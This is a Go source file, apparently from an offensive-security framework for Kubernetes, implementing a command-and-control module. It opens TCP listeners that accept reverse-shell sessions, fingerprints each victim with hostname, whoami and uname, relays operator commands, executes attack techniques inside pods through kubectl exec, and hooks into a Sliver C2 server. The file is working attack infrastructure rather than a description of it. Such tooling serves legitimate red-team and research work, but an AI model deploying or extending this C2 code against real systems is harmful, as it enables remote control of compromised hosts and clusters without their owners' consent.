package c2

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/Magier/Ran/armory"
	"github.com/Magier/Ran/domain"
	bus "github.com/Magier/Ran/internal/bus"
	k8s "github.com/Magier/Ran/internal/k8sclient"
)

type C2Started struct {
}

func (c C2Started) MessageName() string {
	return "c2 started"
}
func (c C2Started) String() string {
	return "c2 started"
}

type Session struct {
	Id       string
	Hostname string
	Os       string
	User     string
}

type SessionStarted struct {
	Session Session
}

func (c SessionStarted) MessageName() string {
	return "session started"
}

func (c SessionStarted) String() string {
	return "Session started: " + c.Session.Id
}

type SessionClosed struct {
	Session Session
}

func (c SessionClosed) MessageName() string {
	return "session closed"
}

func (c SessionClosed) String() string {
	return "Session closed: " + c.Session.Id
}

func StartC2(ctx context.Context, mb bus.MessageBus) {
	// listeners := make(map[string]net.Listener)

	var wg sync.WaitGroup
	mb.Subscribe(domain.StartListener{}, func(ctx context.Context, event domain.Event) (domain.Message, error) {
		cmd := event.(domain.StartListener)
		wg.Add(1)
		go func() {
			err := startListener(ctx, mb, cmd.Port)
			if err != nil {
				mb.Publish(domain.ErrorMsg{Level: domain.LevelError, Msg: err.Error()})
			}
			// TODO handle disconnecting listener
			wg.Done()
		}()
		// return startListener(ctx, mb, cmd.Port)
		return nil, nil
	})

	mb.Subscribe(&domain.ExecTTP{}, func(ctx context.Context, event domain.Event) (domain.Message, error) {
		cmd := event.(*domain.ExecTTP)
		// check technique to execute CMD -> kubectl exec uses API
		// or shell listener?
		switch cmd.C2Channel.(type) {
		case armory.KubectlExecCmd:
			stdout, stderr, err := execKubectl(ctx, *cmd)
			if err != nil {
				slog.Warn(err.Error())
			} else {
				msg, err := cmd.TTP.HandleResult(cmd.Target.Entity, stdout, stderr)
				return msg, err
			}
		}
		return nil, nil
	})

	err := mb.Publish(C2Started{})
	if err != nil {
		// panic(err)
		slog.Error("C2", "can't publish c2 started event:", err.Error())
	}

	go ConnectToSliverServer("../sliver_cfg.json", mb)

	// wg.Wait()
}

func startListener(ctx context.Context, bus bus.MessageBus, port uint) error {
	listener, err := net.Listen("tcp", ":"+strconv.FormatUint(uint64(port), 10))
	if err != nil {
		return fmt.Errorf("Unable to bind to port: %s", err)
	}
	defer listener.Close()

	ip := GetOutboundIP()
	err = bus.Publish(ListenerReady{
		Name:     fmt.Sprintf("listen_%s_%d", "tcp", port),
		IP:       ip,
		Port:     port,
		Protocol: domain.TCP,
	})
	if err != nil {
		slog.Error("Error publishing listener event: " + err.Error())
	}

	numSessions := 0

	for {
		select {
		case <-ctx.Done():
			slog.InfoContext(ctx, "Shutting down listener")
			return nil
		default:
			// Accept incoming connections
			conn, err := listener.Accept()
			if err != nil {
				slog.Error(err.Error())
				continue
			}
			numSessions++

			// bus.Publish()
			// Handle client connection in a goroutine
			in := make(chan string, 5)
			out := make(chan string, 5)
			go handleSession(ctx, bus, conn, strconv.Itoa(numSessions), in, out)
		}
	}
}

func sendCommand(conn net.Conn, cmd string) (string, error) {
	writer := bufio.NewWriter(conn)
	// _, err := conn.Write([]byte(cmd))
	slog.Debug("Sent command: ", "cmd", cmd)
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		slog.Error("Error sending command: " + err.Error())
		return "", err
	}
	writer.Flush()
	// raw_result := make([]byte, 1024)
	reader := bufio.NewReader(conn)
	s, err := reader.ReadString('\n') // maybe use scanner instead?
	slog.Debug("Rx Simple IO:", s, "")
	if err != nil {
		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
		return "", err
	}
	return strings.Trim(s, "\n"), nil
}

func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, id string, cmds <-chan string, results chan<- string) {
	defer conn.Close()
	slog.Debug("C2", "", "Handling session")

	hostname, err := sendCommand(conn, "hostname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	user, err := sendCommand(conn, "whoami")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	os, err := sendCommand(conn, "uname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	// results <- os
	err = bus.Publish(SessionStarted{Session: Session{
		Id:       id,
		Hostname: hostname,
		Os:       os,
		User:     user,
	}})
	if err != nil {
		slog.Error("Error publishing session started event:", err.Error(), "")
	}

	for {
		select {
		case <-ctx.Done():
			close(results)
			return
		default:
			cmd := <-cmds

			res, err := sendCommand(conn, cmd)
			if err != nil {
				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
			}
			slog.Debug("Received data: " + string(res))
			results <- res
		}
	}
}

// Get preferred outbound ip of this machine
// source https://stackoverflow.com/a/37382208
func GetOutboundIP() net.IP {
	// this does _not_ establish an outbound connection, because it uses UDP
	// target IP does not need to exist
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		slog.Error(err.Error())
		return net.IPv4(127, 0, 0, 1)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP
}

func execKubectl(ctx context.Context, cmd domain.ExecTTP) (string, string, error) {
	client, err := k8s.NewK8sClient("")
	if err != nil {
		return "", "", err
	}

	target := cmd.GetTarget()
	if target.Entity == nil {
		return "", "", fmt.Errorf("Could not exec command: No valid target selected!")
	}

	var targetName string
	// ensure target is actually a pod
	if pod, ok := target.Entity.(domain.Pod); ok {
		targetName = target.Name
	} else {
		workload, ok := target.Entity.(domain.Workload)
		if ok {
			pods := workload.GetPods()
			if len(pods) > 0 {
				pod = pods[0]
			} else {
				return "", "", fmt.Errorf("No target pod found in workload '%s'", target.Name)
			}
		}
		targetName = pod.Name
	}

	// TODO: handle case of multiple containers
	stdOut, stdErr, err := k8s.ExecInPod(ctx, client, targetName, target.Ns, cmd.Cmd)
	return stdOut, stdErr, err
}
